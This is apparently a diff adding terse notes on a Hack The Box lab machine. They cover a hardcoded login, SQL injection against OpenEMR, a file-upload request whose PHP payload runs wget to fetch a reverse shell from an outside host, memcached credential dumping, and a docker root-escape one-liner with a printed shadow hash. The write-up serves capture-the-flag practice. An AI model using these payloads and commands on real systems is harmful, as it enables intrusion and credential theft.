@@ -1,0 +1,75 @@
+- nmap said 22 and 80
+- 80 had a website with login
+- Seemed like login was checked without sending form ie the script had to be somewhere local
+- Indeed found a script only validating if username was ash and password H@v3_fun
+- logged in found nothing
+- in the contact page of author in cache.htb there was a reference to a hospital management system
+- so used hms.htb to go to that site
+- there was a cms called on openemr v5.0.1.3
+- found sql injection used sqlmap to exploit
+- got hash of openemr_admin which john said was xxxxxx 
+- logged in as openemr_admin
+- stole cookies whenever required from here
+- another exploit let me upload files, naturally uploaded reverse shell 
+- request used was,
+POST /portal/import_template.php HTTP/1.1
+Host: hms.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101        Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: OpenEMR=slvc4dqassl1tacvksldlfo566; PHPSESSID=qn8fe4sjhif3o8699j9b6loo60
+Referer: http://hms.htb/portal/account/register.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+
+mode=save&docid=payload.php&content=<?php system("wget http://10.10.15.136:8080/php-reverse-shell.php");?>
+- navigated to http://hms.htb/portal/payload.php to download reverse shell and then http://hms.htb/portal/php-reverse-shell.php to get reverse shell
+- got in as www-data 
+- to get better shell ran python ptty then su as ash using H@v3_fun found before
+- then ran netstat -tulpn to find services running and one was higher up in 11211 called memcached (fitting)
+- memcached stores data in 'slabs'
+- accessed like this
+stats cachedump 1 0 <<<< command
+stats cachedump 1 0
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+get link
+get link
+VALUE link 0 21
+https://hackthebox.eu
+END
+get user
+get user
+VALUE user 0 5
+luffy
+END
+get passwd
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+get file
+get file
+VALUE file 0 7
+nothing
+END
+get account
+get account
+VALUE account 0 9
+afhj556uo
+END
+
+- So we got luffy with password 0n3_p1ec3
+- su as him 
+- he could run docker and the machine seemed to have ubuntu image
+- ran gtfobin with docker and got root
+    docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+root:$6$bWa.Lbnz$k0KbMyNbdOQRcY5pWuHM2bfkF5ek8c0CTNsi00qFHmp04NqcefCsIXZTdJgqToRar5zcEk5k8KFhbIomGB3Kb/:18178:0:99999:7:::
+PWNNNNEEDDD
